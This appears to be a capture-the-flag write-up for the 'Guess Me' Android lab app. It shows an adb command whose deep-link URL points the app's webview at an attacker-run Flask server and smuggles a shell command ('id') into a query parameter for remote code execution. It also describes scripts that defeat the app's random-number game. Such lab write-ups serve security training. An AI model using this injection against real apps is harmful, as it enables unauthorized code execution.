# Writeup for Guess me challenge.

Full Writeup at my blog --> [GuessMe](https://blog.parad0x.vip/blog/2024/09/10/GuessMe.html)
--- 

## Objective
Exploit a Deep Link Vulnerability for Remote Code Execution: 
Your mission is to manipulate the deep link functionality in the "Guess Me" Android application, 
allowing you to execute remote code and gain unauthorized access.

## PoC RCE
Before running the Python script: 

```sh
python3 -m venv `pwd` && \
source bin/activate && \
python3 -m pip install Flask flask-requests && \
python3 server.py
```

Once the server is up and running you should send the following payload:
```sh
adb shell am start -a android.intent.category.BROWSABLE \
-n com.mobilehackinglab.guessme/.WebviewActivity \
-d "mhl://mobilehackinglab/?url=http://192.168.0.210/search?Time=\'id\'%26q=mobilehackinglab.com"
```

<img width="300" alt="image" src="https://github.com/user-attachments/assets/3077b079-e291-41d5-bdaa-8fd2886c6d70">


## Bonus 
The `timestamp.sh` script needs to be executable.

### Random + timestamp
This is a very inconsistent way to bypass the Random function.

To run the script first compile the Java code :
`javac -Xlint newGuessRandom.java`

Then run the script:
`java -cp . newGuessRandom.java 2>/dev/nul`

It will take some time to find, but it works! ~~I swear~~

<img width="600" alt="image" src="https://github.com/user-attachments/assets/b27b5aea-048c-452c-8bbf-5b4387733c48">


### Random + binary search
This way is a very consistent way of finding the guess number using a different approach.

To run the script, first compile the java code:
`javac -Xlint newSuperGuessRandom.java`

To run the script:
`java -cp . newSuperGuessRandom.java 2>/dev/null`

<img width="600" alt="image" src="https://github.com/user-attachments/assets/e4d1759e-c109-443c-8630-e7d4a611e5a2">

## Conclusion

On my blog, I'll cover all the steps, what worked and what didn't, why I created two ways to bypass the random number generator.
Why it's possible to get an RCE and run an alert on this vulnerable application.
